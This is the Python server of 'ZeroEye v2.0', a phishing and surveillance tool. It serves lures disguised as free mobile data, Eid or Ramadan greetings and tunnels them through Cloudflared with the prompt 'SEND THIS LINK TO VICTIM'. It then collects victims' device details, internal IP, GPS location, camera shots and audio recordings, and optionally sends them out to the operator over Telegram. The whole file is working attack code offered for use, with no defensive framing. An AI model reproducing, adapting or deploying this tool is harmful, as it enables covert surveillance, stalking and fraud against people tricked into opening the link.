import os
import sys
import json
import asyncio
import time
import shutil
from typing import Optional
from fastapi import FastAPI, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel

# Import internal modules (Assuming they are in same dir for simplicity or core/)
from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

# === CONFIGURATION ===
console = Console()
app = FastAPI(docs_url=None, redoc_url=None)

# CORS to allow Beacon API
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount Static Files
if not os.path.exists("static"): os.makedirs("static")
if not os.path.exists("captured"): os.makedirs("captured")
app.mount("/static", StaticFiles(directory="static"), name="static")

# Global Config State
CONFIG = {
    "telegram_enabled": False,
    "bot_token": "",
    "chat_id": "",
    "template": "free_data"
}
bot = None

# === ROUTES ===

@app.get("/")
async def serve_index():
    """Serves the selected template"""
    template_path = f"templates/{CONFIG['template']}.html"
    if not os.path.exists(template_path):
        return HTMLResponse("<h1>Error: Template not found</h1>")
    
    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()
    return HTMLResponse(content)

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    """Receives System Info"""
    info = json.loads(data)
    log_msg = f"📱 **SYSTEM HIT**\nPlatform: {info.get('platform')}\nCores: {info.get('cores')}\nRAM: {info.get('ram')}\nScreen: {info.get('screen')}\nGPU: {info.get('gpu')}"
    
    console.print(f"[green][+] System Info Received from {info.get('platform')}[/green]")
    if CONFIG["telegram_enabled"] and bot:
        bot.send_message(log_msg)
    
    save_local("info.txt", log_msg)
    return {"status": "ok"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    info = json.loads(data)
    msg = f"🌐 **NETWORK LEAK**\nInternal IP: `{info.get('internal_ip')}`"
    if CONFIG["telegram_enabled"] and bot:
        bot.send_message(msg)
    return {"status": "ok"}

@app.post("/upload_geo")
async def receive_geo(data: str = Form(...)):
    info = json.loads(data)
    maps_link = f"https://www.google.com/maps/place/{info['lat']},{info['lon']}"
    msg = f"📍 **LOCATION DETECTED**\nLat: `{info['lat']}`\nLon: `{info['lon']}`\nAcc: {info['acc']}m\n[Open in Maps]({maps_link})"
    
    if CONFIG["telegram_enabled"] and bot:
        bot.send_message(msg)
    return {"status": "ok"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    filename = f"captured/cam_{int(time.time())}_{file.filename}.jpg"
    with open(filename, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    
    console.print("[green][+] Camera Shot Received[/green]")
    if CONFIG["telegram_enabled"] and bot:
        bot.send_photo(filename, caption="📸 **Victim Camera Shot**")
    
    return {"status": "ok"}

@app.post("/upload_audio")
async def receive_audio(file: UploadFile = File(...)):
    filename = f"captured/audio_{int(time.time())}.wav"
    with open(filename, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    
    console.print("[cyan][+] Audio Clip Received (15s)[/cyan]")
    if CONFIG["telegram_enabled"] and bot:
        bot.send_audio(filename, caption="🎙️ **Audio Recording**")
    
    return {"status": "ok"}

# === UTILS ===

def save_local(filename, data):
    with open(f"captured/{filename}", "a") as f:
        f.write(f"\n--- {time.ctime()} ---\n{data}\n")

def start_wizard():
    """The Interactive CLI Wizard"""
    console.clear()
    console.print(get_banner())
    
    console.print(Panel("Welcome to ZeroEye v2.0 - The Nuclear Recon Tool", style="bold red"))
    
    # 1. Telegram Config
    if Confirm.ask("[bold yellow]Do you want to enable Telegram Exfiltration?[/bold yellow]"):
        CONFIG["telegram_enabled"] = True
        CONFIG["bot_token"] = Prompt.ask("Enter Telegram Bot Token")
        CONFIG["chat_id"] = Prompt.ask("Enter Your Chat ID")
        global bot
        bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        bot.send_message("🚀 **ZeroEye Started!** Waiting for targets...")
    
    # 2. Template Selection
    console.print("\n[bold cyan]Select a Template:[/bold cyan]")
    console.print("1. Free Data Gift (Jazz/Zong/STC)")
    console.print("2. Eid Greeting")
    console.print("3. Ramadan Special")
    
    choice = Prompt.ask("Choose", choices=["1", "2", "3"], default="1")
    if choice == "1": CONFIG["template"] = "free_data"
    elif choice == "2": CONFIG["template"] = "eid"
    elif choice == "3": CONFIG["template"] = "ramadan"

    # 3. Tunnel Selection
    console.print("\n[bold cyan]Select Tunnel:[/bold cyan]")
    console.print("1. Cloudflared (Recommended - No Account)")
    console.print("2. Localhost (For testing)")
    
    t_choice = Prompt.ask("Choose", choices=["1", "2"], default="1")
    
    port = 8080
    
    # Start Server
    console.print(f"\n[green][*] Starting ZeroEye Server on port {port}...[/green]")
    
    if t_choice == "1":
        tunnel = TunnelManager(port)
        public_url = tunnel.start_cloudflared()
        console.print(Panel(f"[bold white]SEND THIS LINK TO VICTIM:[/bold white]\n[bold green]{public_url}[/bold green]", title="Attack Vector"))
    
    # Run FastAPI
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="critical")

if __name__ == "__main__":
    start_wizard()
